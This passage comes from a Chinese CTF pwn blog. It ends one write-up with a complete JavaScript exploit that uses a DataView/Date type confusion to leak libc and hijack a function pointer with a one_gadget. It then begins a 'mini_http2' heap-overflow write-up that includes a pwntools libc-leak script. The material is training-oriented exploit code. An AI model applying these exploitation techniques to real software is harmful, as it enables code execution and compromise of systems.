class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>setTime</code> 可以修改 <code>js_Object.u.number</code>，因此我们修改 <code>dataview</code> 为 <code>date</code>，执行完 <code>setTime</code> 后再改回来：</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set c type to Date</span></span><br><span class="line"><span class="built_in">Date</span>.prototype.setTime.bind(c)(<span class="number">1.09522e+12</span>) <span class="comment">// write number + length</span></span><br><span class="line"><span class="comment">/* c.setTime(0) */</span></span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">16</span>); <span class="comment">// set c type back to DataView</span></span><br><span class="line">print(c.getLength())</span><br></pre></td></tr></table></figure>
<ul>
<li>这里不能直接使用 <code>c.setTime(0)</code>， 对象的 <code>prototype</code> 在我们一创建的时候其实就已经确定了,所以当我们改变 <code>type</code> 的时候 <code>prototype</code> 并没有改变</li>
<li>而 <code>prototype</code> 基本就已经定义了这个对象可以调用哪些方法</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5555555c2b40</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5555555c2b40</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5555555c2b48</span> ◂— <span class="number">0x71</span> <span class="comment">/* &#x27;q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5555555c2b50</span> ◂— <span class="number">0x10000000a</span> <span class="comment">/* type:date */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5555555c2b58</span> —▸ <span class="number">0x55555559b0a0</span> —▸ <span class="number">0x555555585089</span> ◂— <span class="number">0x6d6172676f727000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5555555c2b60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x5555555c2b68</span> —▸ <span class="number">0x5555555a5780</span> ◂— <span class="number">0x100000010</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5555555c2b70</span> ◂— <span class="number">0x426fe0065ea00000</span> <span class="comment">/* length */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5555555c2b78</span> —▸ <span class="number">0x5555555c2bc0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这之后就可以泄露 libc_base 了</li>
<li>最后修改某个 <code>dataview</code> 的 <code>type</code> 为 <code>JS_CCFUNCTION</code>（<code>enum-4</code>），在 <code>js_call</code> 可以调用函数指针 <code>obj-&gt;u.c.function</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">js_call</span><span class="params">(js_State *J, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	js_Object *obj;</span><br><span class="line">	<span class="keyword">int</span> savebot;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj-&gt;type == JS_CCFUNCTION) &#123;</span><br><span class="line">		jsR_pushtrace(J, obj-&gt;u.c.name, <span class="string">&quot;native&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		jsR_callcfunction(J, n, obj-&gt;u.c.length, obj-&gt;u.c.function);</span><br><span class="line">		--J-&gt;tracetop;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BOT = savebot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>覆盖这里为 one_gadget 就可以了</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">b = DataView(<span class="number">0x68</span>);</span><br><span class="line">a = DataView(<span class="number">0x48</span>);</span><br><span class="line">b = DataView(<span class="number">0x48</span>);</span><br><span class="line">c = DataView(<span class="number">0x48</span>);</span><br><span class="line">e = DataView(<span class="number">0x48</span>);</span><br><span class="line">f = DataView(<span class="number">0x1000</span> * <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set c type to Date</span></span><br><span class="line">Date.prototype.setTime.bind(c)(<span class="number">1.09522e+12</span>) <span class="comment">// write number + length</span></span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">16</span>); <span class="comment">// set c type back to DataView</span></span><br><span class="line">print(c.getLength())</span><br><span class="line"></span><br><span class="line">sh32 = <span class="number">4294967296</span> <span class="comment">// 1&lt;&lt;32</span></span><br><span class="line">libb_addr_off = <span class="number">472</span></span><br><span class="line">libc_leak = c.getUint32(libb_addr_off) + (c.getUint32(libb_addr_off+<span class="number">4</span>)*sh32)</span><br><span class="line"></span><br><span class="line">libc_off = <span class="number">0x7ffff7c31000</span> - <span class="number">0x7ffff6bfe010</span> <span class="comment">// got this from gdb</span></span><br><span class="line">libc_base = libc_leak + libc_off</span><br><span class="line">print(&#x27;libc base:&#x27;, libc_base.toString(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">one_gag = libc_base + <span class="number">0xe6af4</span></span><br><span class="line">print(&#x27;onegadget:&#x27;, one_gag.toString(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">e_obj_off = <span class="number">192</span></span><br><span class="line">c.setUint8(<span class="number">160</span>, <span class="number">4</span>) <span class="comment">// this sets type to JS_CCFUNCTION</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set lower 4 bytes of js_CFunction function</span></span><br><span class="line">c.setUint32(e_obj_off+<span class="number">8</span>, one_gag&amp;<span class="number">0xffffffff</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">// set upper 4 bytes of js_CFunction function</span></span><br><span class="line">c.setUint32(e_obj_off+<span class="number">8</span>+<span class="number">4</span>, Math.floor(one_gag/sh32)&amp;<span class="number">0xffffffff</span>) </span><br><span class="line">e() <span class="comment">// e is now a function so we can call it </span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这应该是我复现的第一个 JavaScript 解释器（拖了好久了），第一次接触这种题目时，发现堆风水根本看不懂，于是放着了…</p>
<p>后来我在各个可能会申请内存的函数中打上断点，调试了一会网上的 wp 才弄清楚了一点堆风水，感觉这种题目还是没法完全掌握 heap 的分配情况（尤其是没有符号，大大增加了调试和逆向的难度），所以探索 heap 排布就只能靠尝试（目前太菜了，没有什么好方法）</p>
<p>最后学到了一个类型混淆的利用技术，感觉也是比较套路化的，只要把堆风水搞好就问题不大</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/30/%E5%A0%86%E6%BA%A2%E5%87%BA+Tcache%20Attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/30/%E5%A0%86%E6%BA%A2%E5%87%BA+Tcache%20Attack/" class="post-title-link" itemprop="url">堆溢出+Tcache Attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-30 23:39:41" itemprop="dateCreated datePublished" datetime="2022-09-30T23:39:41+08:00">2022-09-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-19 18:00:50" itemprop="dateModified" datetime="2022-12-19T18:00:50+08:00">2022-12-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>mini_http2</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>)</span> stable release version 2.35</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>_amd64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=f44285458d02382631cf8f9747971f71a6b36211, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，全开</li>
</ul>
<p><strong>程序逻辑</strong></p>
<p>在以下调用链中可以泄露 libc_base：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main -&gt; pwn -&gt; protocol_fun -&gt; ops -&gt; login_fun -&gt; <span class="built_in">snprintf</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(v8, <span class="number">0x1000</span>uLL, <span class="string">&quot;&#123;&#x27;msg&#x27;: &#x27;login successful!&#x27;,&#x27;status&#x27;: 1,&#x27;gift&#x27;: \&quot;%p\&quot;&#125;&quot;</span>, &amp;<span class="built_in">strstr</span>);<span class="comment">// 泄露libc</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：函数名称都是我自定义的，凑合看吧</li>
</ul>
<p>根据程序逻辑，在执行 <code>login_fun</code> 前，必须先执行 <code>register_fun</code>，调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main -&gt; pwn -&gt; protocol_fun -&gt; ops -&gt; register_fun </span><br></pre></td></tr></table></figure>
<p>这两个函数都依靠一个字符串 <code>protocol</code>（包括 <code>url</code>）来运行对应的逻辑，里面有许多检查</p>
<ul>
<li>register_fun：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">strstr</span>(a1, <span class="string">&quot;username=&quot;</span>);</span><br><span class="line">pwd = <span class="built_in">strstr</span>(a1, <span class="string">&quot;password=&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !name || !pwd ) <span class="comment">/* protocol中必须要有username和password */</span></span><br><span class="line">	output(<span class="string">&quot;Invalid argv&quot;</span>);</span><br><span class="line">name_last = <span class="built_in">strchr</span>(name, <span class="string">&#x27;&amp;&#x27;</span>); </span><br><span class="line"><span class="keyword">if</span> ( !name_last ) <span class="comment">/* 用于计算name的长度 */</span></span><br><span class="line">	name_last = &amp;name[<span class="built_in">strlen</span>(name)];</span><br><span class="line">pwd_last = <span class="built_in">strchr</span>(pwd, <span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !pwd_last ) <span class="comment">/* 用于计算pwd的长度 */</span></span><br><span class="line">	pwd_last = &amp;pwd[<span class="built_in">strlen</span>(pwd)];</span><br><span class="line">name_chunk = <span class="built_in">malloc</span>(name_last - name - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memset</span>(name_chunk, <span class="number">0</span>, name_last - name - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(name_chunk, name + <span class="number">9</span>, name_last - name - <span class="number">9</span>);</span><br><span class="line">pwd_chunk = <span class="built_in">malloc</span>(pwd_last - pwd - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memset</span>(pwd_chunk, <span class="number">0</span>, pwd_last - pwd - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pwd_chunk, pwd + <span class="number">9</span>, pwd_last - pwd - <span class="number">9</span>);</span><br><span class="line"><span class="keyword">if</span> ( name_st )</span><br><span class="line">    <span class="built_in">free</span>(name_st);</span><br><span class="line"><span class="keyword">if</span> ( pwd_st )</span><br><span class="line">    <span class="built_in">free</span>(pwd_st);</span><br><span class="line">name_st = (<span class="keyword">char</span> *)name_chunk; <span class="comment">/* 把name_chunk放入全局变量name_st */</span></span><br><span class="line">pwd_st = (<span class="keyword">char</span> *)pwd_chunk; <span class="comment">/* 把pwd_chunk放入全局变量pwd_st */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>login_fun：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">strstr</span>(a1, <span class="string">&quot;username=&quot;</span>);</span><br><span class="line">pwd = <span class="built_in">strstr</span>(a1, <span class="string">&quot;password=&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !login_key )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !name || !pwd ) <span class="comment">/* protocol中必须要有username和password */</span></span><br><span class="line">        output(<span class="string">&quot;Invalid argv&quot;</span>);</span><br><span class="line">    name_last = <span class="built_in">strchr</span>(name, <span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !name_last ) <span class="comment">/* 用于计算name的长度 */</span></span><br><span class="line">        name_last = &amp;name[<span class="built_in">strlen</span>(name)];</span><br><span class="line">    pwd_last = <span class="built_in">strchr</span>(pwd, <span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !pwd_last ) <span class="comment">/* 用于计算pwd的长度 */</span></span><br><span class="line">        pwd_last = &amp;pwd[<span class="built_in">strlen</span>(pwd)];</span><br><span class="line">    name_chunk = <span class="built_in">malloc</span>(name_last - name - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name_chunk, <span class="number">0</span>, name_last - name - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(name_chunk, name + <span class="number">9</span>, name_last - name - <span class="number">9</span>);</span><br><span class="line">    pwd_chunk = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(pwd_last - pwd - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(pwd_chunk, <span class="number">0</span>, pwd_last - pwd - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pwd_chunk, pwd + <span class="number">9</span>, pwd_last - pwd - <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name_st, (<span class="keyword">const</span> <span class="keyword">char</span> *)name_chunk) &amp;&amp; !<span class="built_in">strcmp</span>(pwd_st, pwd_chunk))</span><br><span class="line">        <span class="comment">/* 对比全局变量name_st/pwd_st和当前获取的name_chunk/pwd_chunk(结果无所谓) */</span></span><br><span class="line">        login_key = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">free</span>(name_chunk);</span><br><span class="line">    <span class="built_in">free</span>(pwd_chunk);</span><br><span class="line">    <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">    <span class="built_in">snprintf</span>(v8, <span class="number">0x1000</span>uLL, <span class="string">&quot;&#123;&#x27;msg&#x27;: &#x27;login successful!&#x27;,&#x27;status&#x27;: 1,&#x27;gift&#x27;: \&quot;%p\&quot;&#125;&quot;</span>, &amp;<span class="built_in">strstr</span>); <span class="comment">/* 泄露libc */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>泄露的脚本如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    size_protocol = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x27&quot;</span></span><br><span class="line">    cmd = size_protocol + <span class="string">&quot;\x01&quot;</span> + <span class="string">&quot;\x05&quot;</span> </span><br><span class="line">    cmd = cmd.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd)</span><br><span class="line"></span><br><span class="line">    size_url = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x20&quot;</span></span><br><span class="line">    ops_cmd = <span class="string">&quot;/login?&quot;</span></span><br><span class="line">    name = <span class="string">&quot;username=&quot;</span> + <span class="string">&quot;123&quot;</span></span><br><span class="line">    pwd = <span class="string">&quot;&amp;password=&quot;</span> + <span class="string">&quot;123&quot;</span></span><br><span class="line">    url = ops_cmd + name + pwd</span><br><span class="line">    protocol = <span class="string">&quot;\x82&quot;</span> + <span class="string">&quot;\x86&quot;</span> + <span class="string">&quot;\x44&quot;</span> + size_url + url</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(protocol)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(url)))</span><br><span class="line">    p.send(protocol)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    size_protocol = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x2a&quot;</span></span><br><span class="line">    cmd = size_protocol + <span class="string">&quot;\x01&quot;</span> + <span class="string">&quot;\x05&quot;</span> </span><br><span class="line">    cmd = cmd.ljust(<span class="number">9</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    p.send(cmd)</span><br><span class="line"> </span><br><span class="line">    size_url = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x23&quot;</span></span><br><span class="line">    ops_cmd = <span class="string">&quot;/register?&quot;</span></span><br><span class="line">    name = <span class="string">&quot;username=&quot;</span> + <span class="string">&quot;123&quot;</span></span><br><span class="line">    pwd = <span class="string">&quot;&amp;password=&quot;</span> + <span class="string">&quot;123&quot;</span></span><br><span class="line">    url = ops_cmd + name + pwd</span><br><span class="line">    protocol = <span class="string">&quot;\x82&quot;</span> + <span class="string">&quot;\x86&quot;</span> + <span class="string">&quot;\x44&quot;</span> + size_url + url</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(protocol)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(url)))</span><br><span class="line">    p.send(protocol)</span><br><span class="line"></span><br><span class="line">register()</span><br><span class="line">login()</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift&#x27;: \&quot;&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\&quot;&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">libc_base = leak_addr - <span class="number">0xc4200</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>另外，程序还提供了许多操作堆的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">api</span><span class="params">(<span class="keyword">char</span> *url, <span class="keyword">char</span> *strs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(url, <span class="string">&quot;/api/add_worker&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        add_worker(url, strs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(url, <span class="string">&quot;/api/del_worker&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        del_worker(url, strs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(url, <span class="string">&quot;/api/show_worker&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        show_worker(url, strs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(url, <span class="string">&quot;/api/edit_worker&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        edit_worker(url, strs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">len_name = <span class="built_in">strlen</span>(name[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="built_in">list</span>[worker_num].name_addr_list, name[<span class="number">4</span>], len_name); <span class="comment">/* 堆溢出 */</span></span><br><span class="line">name_addr_list = <span class="built_in">list</span>[worker_num].name_addr_list;</span><br><span class="line">name_addr_list[<span class="built_in">strlen</span>(name[<span class="number">4</span>])] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">list</span>[worker_num].name_len_list = <span class="built_in">strlen</span>(name[<span class="number">4</span>]);</span><br><span class="line">len_desc = <span class="built_in">strlen</span>(desc[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="built_in">list</span>[worker_num].desc_addr_list, desc[<span class="number">4</span>], len_desc); <span class="comment">/* 堆溢出 */</span></span><br><span class="line">desc_addr_list = <span class="built_in">list</span>[worker_num].desc_addr_list;</span><br><span class="line">desc_addr_list[<span class="built_in">strlen</span>(desc[<span class="number">4</span>])] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">list</span>[worker_num].desc_len_list = <span class="built_in">strlen</span>(desc[<span class="number">4</span>]);</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>edit_worker</code> 中有堆溢出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">exit_s</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *function )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( name_st )</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *))*function)(name_st);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;goodbye!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>exit_s</code> 中会执行一个函数指针，其实它就是 <code>free_hook</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55dc824e1000</span>+<span class="number">0xD0A0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55dc824ee0a0</span> —▸ <span class="number">0x7f1130a994a8</span> (__free_hook) —▸ <span class="number">0x7f11308c9d60</span> (system) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>在 libc-2.34 版本中删除了 <code>free_hook malloc_hook realloc_hook</code> 这些符号</li>
<li>在 libc-2.35 版本中恢复了这些符号，但是在 <code>free malloc realloc</code> 中不会调用它们</li>
</ul>
